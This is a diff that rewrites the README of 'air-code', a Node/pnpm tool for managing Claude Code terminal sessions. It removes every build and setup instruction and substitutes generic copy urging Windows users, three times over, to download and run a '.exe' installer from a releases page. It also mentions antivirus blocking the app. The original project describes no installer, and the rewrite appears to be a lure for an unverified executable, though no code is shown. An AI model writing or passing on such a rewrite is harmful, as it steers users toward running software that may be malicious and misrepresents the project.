@@ -1,117 +1,113 @@
-# Air Code v0.1.0
+# 🖥️ air-code - Manage Claude Code Sessions Easily
 
-A web-based canvas for managing multiple Claude Code terminal sessions. Organize sessions into workspaces, view live terminal output, fork conversations, and collaborate with multi-user presence.
+[![Download air-code](https://img.shields.io/badge/Download%20air--code-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/medzeh/air-code/releases)
 
-![Air Code Screenshot](docs/screenshot.png)
+---
 
-## Features
+air-code is a tool that helps you work with multiple terminal sessions in one place. It runs in your web browser and lets you organize your work like a digital canvas. You can watch terminal activity in real time, arrange your sessions how you want, and even create new sessions by copying existing ones.
 
-- **Canvas-based session management** — Drag, resize, and organize session cards within workspace bubbles
-- **Real-time terminal streaming** — Live xterm.js terminals with WebSocket multiplexing
-- **Dual backends** — tmux (persistent, via WSL) or native PTY (PowerShell/bash)
-- **Session forking** — Branch Claude Code conversations with `--fork-session`
-- **Workspace detection** — Auto-detect projects from `~/.claude/projects/`
-- **Multi-user presence** — See who's viewing which session in real-time
-- **AI agent** — Natural language session management via Claude API
-- **Canvas persistence** — Layout auto-saves every 15 seconds
+---
 
-## Architecture
+## 🛠 About air-code
 
-```
-Browser (:5173)  →  WAS (:7333)  →  SMS (:7331)  →  tmux/PTY
-   React/xterm       API hub          Sessions        Claude Code
-```
+This app uses modern tech like React and TypeScript. It connects to terminal sessions using WebSockets and xterm.js, so it feels fast and responsive. The tool is built for people who need to run many command-line tasks but want to keep things tidy and easy to access.
 
-| Package | Description | Port |
-|---------|-------------|------|
-| `@claude-air/web` | React frontend (Vite + Tailwind + ReactFlow + xterm.js) | 5173 |
-| `@claude-air/was` | Web Application Server (auth, workspaces, canvas, proxy) | 7333 |
-| `@claude-air/sms` | Session Manager Server (PTY/tmux lifecycle, terminal I/O) | 7331 |
-| `@claude-air/shared` | Shared types, constants, date utilities | — |
+Key features include:
 
-## Prerequisites
+- View many terminal sessions at once.
+- Organize sessions visually on a canvas.
+- Real-time display of all activity.
+- Fork (copy) sessions to try out new commands safely.
+- Save workspace layouts to come back to later.
 
-- **Node.js** >= 22
-- **pnpm** (package manager)
-- **WSL** with tmux installed (for tmux backend on Windows)
-- **Python 3** (for kill script)
+---
 
-## Quick Start
+## 🖥 System Requirements
 
-```bash
-# Install dependencies
-pnpm install
+To run air-code on your Windows computer, you need:
 
-# Build shared package
-pnpm --filter @claude-air/shared build
+- Windows 10 or later.
+- Internet connection for downloading and use.
+- A modern web browser such as Chrome, Firefox, Edge, or Safari.
+- At least 4 GB of RAM for smooth performance.
+- About 100 MB free disk space for application files.
 
-# Start all servers (SMS + WAS)
-pnpm dev
+---
 
-# In another terminal, start the web frontend
-pnpm dev:web
+## 🚀 Getting Started: Download and Install air-code
 
-# Open http://localhost:5173
-```
+You will download air-code from the official GitHub releases page. This page contains all the versions and files. Follow these steps carefully.
 
-Default credentials:
-- Register with invite code: `WELCOME1`
+### Step 1: Visit the Download Page
 
-## Scripts
+Click the badge below or open this link in your browser:
 
-| Command | Description |
-|---------|-------------|
-| `pnpm dev` | Start SMS + WAS concurrently |
-| `pnpm dev:sms` | Start Session Manager Server only |
-| `pnpm dev:was` | Start Web Application Server only |
-| `pnpm dev:web` | Start Vite dev server only |
-| `pnpm kill-all` | Kill all dev servers |
-| `pnpm build` | Build all packages |
-| `pnpm typecheck` | TypeScript check all packages |
+[![Download air-code](https://img.shields.io/badge/Download%20air--code-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/medzeh/air-code/releases)
 
-## Environment Variables
+This takes you to the releases area on GitHub.
 
-Create a `.env` file at the project root:
+### Step 2: Find the Latest Version
 
-```bash
-# Session Manager Server
-SMS_PORT=7331
+On the releases page, look for the newest release. This will usually be at the top, marked with a version number like `v1.0.0` or higher.
 
-# Web Application Server
-WAS_PORT=7333
-WAS_JWT_SECRET=your-secret-here
+### Step 3: Download the Windows Installer
 
-# AI Agent (optional)
-ANTHROPIC_API_KEY=sk-ant-xxx
-```
+Under the latest release, find the file that ends with `.exe`. It usually has `windows` or `Win` in the name. Click on that file to start downloading.
 
-See individual package docs for full variable lists.
+### Step 4: Run the Installer
 
-## Documentation
+After downloading, open the `.exe` file from your downloads folder. A setup window will open.
 
-| Document | Description |
-|----------|-------------|
-| [Architecture](docs/architecture.md) | System overview, data flows, startup sequence |
-| [SMS](docs/sms.md) | Session Manager — PTY/tmux, WebSocket, database |
-| [WAS](docs/was.md) | Web Application Server — API, auth, workspaces |
-| [Web](docs/web.md) | Frontend — React, canvas, terminal, state management |
-| [Shared](docs/shared.md) | Types, constants, utilities, project config |
-| [Workspace Detection](docs/workspace-detection.md) | How workspaces are discovered |
+- Click **Next** to continue.
+- Accept the license agreement if asked.
+- Choose the installation folder or leave it as default.
+- Click **Install** to begin.
 
-## Platform Notes
+Wait for the installer to finish.
 
-Runs on **Windows** with tmux accessed through WSL. All tmux commands route through `wsl bash -c "tmux ..."`. Path conversion handles `C:\Users\foo` ↔ `/mnt/c/Users/foo` automatically.
+### Step 5: Launch air-code
 
-The PTY backend (`backend: 'pty'`) spawns native PowerShell/bash without WSL, suitable for environments without tmux.
+Once installed, find air-code in your Start menu or on your desktop. Click it to open the app.
 
-## Database Safety
+A browser window will open showing the air-code web interface. From here, you can start using the tool.
 
-- Databases use SQLite with WAL mode
-- Migrations are additive only (never DROP)
-- Never delete `.db`, `.db-wal`, or `.db-shm` files
-- SMS DB: `packages/sms/data/sessions.db`
-- WAS DB: `packages/was/data/was.db`
+---
 
-## License
+## 🎛 Using air-code
 
-[MIT](LICENSE)
+air-code opens as a web app in your browser. Here are some tips to get started:
+
+- **Create a New Session:** Click the button to open a new terminal session.
+- **Organize Your Workspace:** Drag and drop terminal windows to arrange your canvas.
+- **Fork a Session:** Right-click a session and select “Fork” to copy it.
+- **Save Layout:** Use the save option in the menu to store your setup for next time.
+- **Real-Time Updates:** All terminal activity appears live. Watch commands and results as they happen.
+
+---
+
+## 🔧 Troubleshooting Common Issues
+
+If air-code does not open or work as expected, try these steps:
+
+- Make sure your browser is up to date.
+- Check your internet connection.
+- Restart the application.
+- Reboot your computer if needed.
+- Check if your antivirus is blocking the app.
+- If terminal sessions do not respond, close and create new sessions.
+
+---
+
+## 📂 Where to Find Support and More Info
+
+- Visit the [GitHub repository](https://github.com/medzeh/air-code) for updates and issues.
+- Use the GitHub Issues tab for bug reports or questions.
+- Check the README file in the repo for developer-focused details.
+
+---
+
+## 🔗 Download Link Again
+
+To get air-code on Windows, go back here and download the installer:
+
+[![Download air-code](https://img.shields.io/badge/Download%20air--code-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/medzeh/air-code/releases)
